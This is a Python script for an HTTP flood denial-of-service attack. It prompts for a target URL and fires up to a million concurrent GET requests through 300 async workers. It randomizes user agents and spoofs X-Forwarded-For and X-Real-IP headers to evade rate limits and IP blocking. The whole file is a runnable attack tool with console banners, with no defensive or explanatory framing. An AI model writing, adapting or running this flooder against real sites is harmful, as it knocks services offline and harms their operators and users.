import asyncio
import random
import aiohttp
from faker import Faker

fake = Faker()

def gprint(msg):
    print(f"\033[92m{msg}\033[0m")  # Green text

def rprint(msg):
    print(f"\033[91m{msg}\033[0m")  # Red text

tur1 = input("\033[92m [×] ENTER TARGET URL: \033[0m").strip()
threads = 300
total_requests = 1000000
packet_count = 0
lock = asyncio.Lock()
sem = asyncio.Semaphore(1000)
rate_limit = 10000  # Requests per second

def random_ip():
    return ".".join(str(random.randint(1, 255)) for _ in range(4))

def random_user_agent():
    android_versions = ['10', '11', '12', '13', '14']
    ios_versions = ['14_0', '15_2', '16_3', '17_1']
    chrome_versions = [f"{random.randint(100, 122)}.0.{random.randint(1000, 4999)}.100"]
    safari_versions = [f"{random.randint(13, 17)}.0"]
    android_devices = ['SM-G991B', 'SM-A205U', 'Pixel 6', 'Redmi Note 10', 'OnePlus 9', 'Realme GT', 'Infinix Zero']
    iphone_models = ['iPhone X', 'iPhone 11', 'iPhone 12', 'iPhone 13 Pro', 'iPhone 14 Pro Max']
    ipad_models = ['iPad Pro', 'iPad Air', 'iPad Mini']

    ua_type = random.choice(['android', 'iphone', 'ipad', 'windows', 'mac'])

    if ua_type == 'android':
        device = random.choice(android_devices)
        version = random.choice(android_versions)
        chrome = random.choice(chrome_versions)
        return f"Mozilla/5.0 (Linux; Android {version}; {device}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome} Mobile Safari/537.36"

    elif ua_type == 'iphone':
        ios = random.choice(ios_versions)
        model = random.choice(iphone_models)
        safari = random.choice(safari_versions)
        return f"Mozilla/5.0 (iPhone; CPU {model} OS {ios} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{safari} Mobile/15E148 Safari/604.1"

    elif ua_type == 'ipad':
        ios = random.choice(ios_versions)
        model = random.choice(ipad_models)
        safari = random.choice(safari_versions)
        return f"Mozilla/5.0 (iPad; CPU {model} OS {ios} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{safari} Safari/604.1"

    elif ua_type == 'windows':
        win_version = random.choice(['10.0', '6.3', '6.1'])
        chrome = random.choice(chrome_versions)
        return f"Mozilla/5.0 (Windows NT {win_version}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome} Safari/537.36"

    elif ua_type == 'mac':
        mac_version = random.choice(['10_15_7', '11_2_3', '12_6'])
        safari = random.choice(safari_versions)
        return f"Mozilla/5.0 (Macintosh; Intel Mac OS X {mac_version}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{safari} Safari/605.1.15"

    else:
        return "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"

async def send_packet(session):
    global packet_count
    while True:
        async with lock:
            if packet_count >= total_requests:
                return
            packet_count += 1
            current = packet_count

        headers = {
            "User-Agent": random_user_agent(),
            "X-Forwarded-For": random_ip(),
            "X-Real-IP": random_ip(),
            "Accept": "*/*",
            "Connection": "keep-alive"
        }

        try:
            async with sem:
                async with session.get(
                    tur1,
                    headers=headers,
                    timeout=aiohttp.ClientTimeout(total=7)
                ) as resp:
                    gprint(f"[+] Packet {current} sent | Status: {resp.status}")
                    await asyncio.sleep(1 / rate_limit)
        except Exception:
            rprint(f"[-] Packet {current} failed or timed out")

async def main():
    connector = aiohttp.TCPConnector(limit=0, ssl=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        await asyncio.gather(*[asyncio.create_task(send_packet(session)) for _ in range(threads)])

if __name__ == "__main__":
    gprint(f"\n>>> TARGET: {tur1}")
    gprint(f">>> THREADS: {threads}")
    gprint(f">>> TOTAL REQUESTS: {total_requests}")
    gprint(f">>> RATE LIMIT: {rate_limit} req/s")
    gprint(f">>> TIMEOUT PER REQUEST: 3s\n")
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        rprint("\n[×] Stopped by user.")
